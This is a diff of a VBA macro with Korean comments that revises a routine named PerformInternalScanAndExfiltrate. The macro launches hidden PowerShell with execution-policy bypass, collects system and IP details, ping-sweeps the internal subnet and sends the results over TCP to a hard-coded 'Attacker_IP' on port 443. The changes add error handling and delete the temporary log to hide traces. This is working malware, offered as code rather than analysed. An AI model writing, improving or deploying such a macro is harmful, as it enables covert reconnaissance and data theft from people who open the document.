@@ -45,6 +45,8 @@ End Sub
 ' 시스템 정보 수집, 내부 스캐닝 및 데이터 유출 함수 (443 포트)
 Sub PerformInternalScanAndExfiltrate()
     Dim shell As Object
+    Dim fso As Object
+    Dim ts As Object
     Dim psCommand As String
     Dim Attacker_IP As String
     Dim Attacker_Port As String
@@ -54,19 +56,39 @@ Sub PerformInternalScanAndExfiltrate()
     Attacker_IP = "10.44.44.44"
     Attacker_Port = "443"
     
-    Log_File = Environ$("TEMP") & "\scan_log_" & Format(Now, "hhmmss") & ".txt"
+    ' 임시 파일 경로
+    Log_File = Environ$("TEMP") & "\scan_results_" & Format(Now, "hhmmss") & ".txt"
     
     Set shell = CreateObject("WScript.Shell")
+    Set fso = CreateObject("Scripting.FileSystemObject")
     
-    ' 2. PowerShell 스크립트 작성 (문자열 안정화: 내부 문자열은 모두 작은따옴표로 처리)
+    On Error GoTo ErrorHandler ' 오류 발생 시 로그 파일 정리로 이동
+
+    ' ---------------------------------------------------------------------------------
+    ' Step 1: Log File 생성 및 헤더 기록 (VBA FSO 사용)
+    ' ---------------------------------------------------------------------------------
+    Set ts = fso.CreateTextFile(Log_File, True)
+    ts.WriteLine "--- System Info & Internal Scan Results ---"
+    ts.Close
+    Set ts = Nothing
+
+    ' ---------------------------------------------------------------------------------
+    ' Step 2: PowerShell 정보 수집 및 데이터 전송 (CMD Shell.Run 사용)
+    ' PowerShell 스크립트를 짧게 나누고, CMD를 이용해 Log File에 정보를 추가합니다.
+    ' ---------------------------------------------------------------------------------
     
-    ' PowerShell 스크립트의 큰따옴표를 작은따옴표로 모두 변경하여 VBA 문자열 오류를 해결합니다.
-    psCommand = "powershell.exe -NoP -NonI -WindowStyle Hidden -Exec Bypass -Command """ & _
-                "$L='" & Log_File & "'; $E='SilentlyContinue';" & _
-                "Add-Content -Path $L -Value '--- Admin System Info ---' -Encoding Default -ErrorAction $E;" & _
-                "Get-ComputerInfo | Select WindowsProductName, OsArchitecture, CsDomain, OsBuildNumber | Format-List | Out-String | Add-Content -Path $L -Encoding Default -ErrorAction $E;" & _
-                "Get-NetIPConfiguration | Out-String | Add-Content -Path $L -Encoding Default -ErrorAction $E;" & _
-                "Add-Content -Path $L -Value '--- Internal Network Scan (192.168/10.x Ping Sweep) ---' -Encoding Default -ErrorAction $E;" & _
+    ' 2-1. 시스템 정보 수집
+    psCommand = "powershell.exe -NoP -NonI -WindowStyle Hidden -Exec Bypass -Command " & _
+                "Add-Content -Path '" & Log_File & "' -Value '--- Detailed Info ---' -Encoding Default -ErrorAction SilentlyContinue;" & _
+                "Get-ComputerInfo | Select WindowsProductName, OsArchitecture, CsDomain, OsBuildNumber | Format-List | Out-String | Add-Content -Path '" & Log_File & "' -Encoding Default -ErrorAction SilentlyContinue;" & _
+                "Get-NetIPConfiguration | Out-String | Add-Content -Path '" & Log_File & "' -Encoding Default -ErrorAction SilentlyContinue"
+    shell.Run psCommand, 0, True ' 시스템 정보 수집 완료 대기
+
+    ' 2-2. 내부 스캐닝 및 데이터 전송
+    ' 스캐닝 로직과 TCP 전송 로직은 하나의 PowerShell 스크립트로 처리하여 안정성 유지
+    psCommand = "powershell.exe -NoP -NonI -WindowStyle Hidden -Exec Bypass -Command " & _
+                "$L='" & Log_File & "';" & _
+                "Add-Content -Path $L -Value '--- Internal Network Scan (192.168/10.x Ping Sweep) ---' -Encoding Default -ErrorAction SilentlyContinue;" & _
                 "$ipPrefix=(Get-NetIPConfiguration | Select-Object IPv4Address | Where-Object { $_.IPv4Address -like '192.168*' -or $_.IPv4Address -like '10*' } | Select-Object -First 1).IPv4Address.Split('.')[-4,-3,-2] -join '.'; " & _
                 "if ($ipPrefix) { 1..254 | ForEach-Object { $ip=$ipPrefix+'.' + $_; if(Test-Connection -ComputerName $ip -Count 1 -ErrorAction Ignore -Quiet) { 'Host ' + $ip + ' is UP' | Add-Content -Path $L -Encoding Default } } };" & _
                 "try {" & _
@@ -78,12 +100,21 @@ Sub PerformInternalScanAndExfiltrate()
                 "  Start-Sleep -s 5;" & _
                 "} catch {} finally {" & _
                 "  if ($C) {$C.Close()};" & _
-                "  Remove-Item $L -ErrorAction $E;" & _
-                "}" & _
-                """" ' PowerShell 명령 문자열을 닫는 최종 큰따옴표
+                "}"
+    
+    shell.Run psCommand, 0, True ' 스캐닝 및 데이터 전송 완료 대기
 
-    ' 3. PowerShell 실행 (숨김 모드, 실행 완료 대기)
-    shell.Run psCommand, 0, True
+    ' ---------------------------------------------------------------------------------
+    ' Step 3: Log File 삭제 (성공 및 오류 발생 시 모두 실행)
+    ' ---------------------------------------------------------------------------------
+ErrorHandler:
+    On Error Resume Next ' 오류 처리 중 오류 무시
+    If fso.FileExists(Log_File) Then
+        fso.DeleteFile Log_File, True ' 로그 파일 정리
+    End If
     
     Set shell = Nothing
+    Set fso = Nothing
+    Exit Sub ' 함수 종료
+
 End Sub
